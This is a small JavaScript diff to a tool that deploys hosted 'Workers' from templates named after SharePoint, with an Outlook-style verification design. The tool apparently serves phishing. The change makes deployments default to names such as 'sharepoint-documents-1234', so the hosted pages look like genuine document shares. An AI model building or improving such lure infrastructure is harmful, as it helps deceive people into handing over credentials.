@@ -391,8 +391,16 @@
             const isExport = activeTab === 'export';
             showLoading(isExport ? 'Generating HTML' : 'Deploying Worker', 'This may take a few seconds...');
 
+            // Generate descriptive worker name if not provided
+            let workerName = document.getElementById('workerName').value.trim();
+            if (!workerName) {
+                const template = selectedTemplate || document.getElementById('templateType').value || 'sharepoint';
+                const timestamp = Date.now().toString().slice(-4);
+                workerName = `${template}-documents-${timestamp}`;
+            }
+            
             const body = {
-                worker_name: document.getElementById('workerName').value || ('link-' + Date.now()),
+                worker_name: workerName,
                 auth_mode: document.getElementById('authMode').value,
                 template_type: selectedTemplate || document.getElementById('templateType').value || 'sharepoint3',
                 verification_design: document.getElementById('verificationDesign').value || 'outlook',
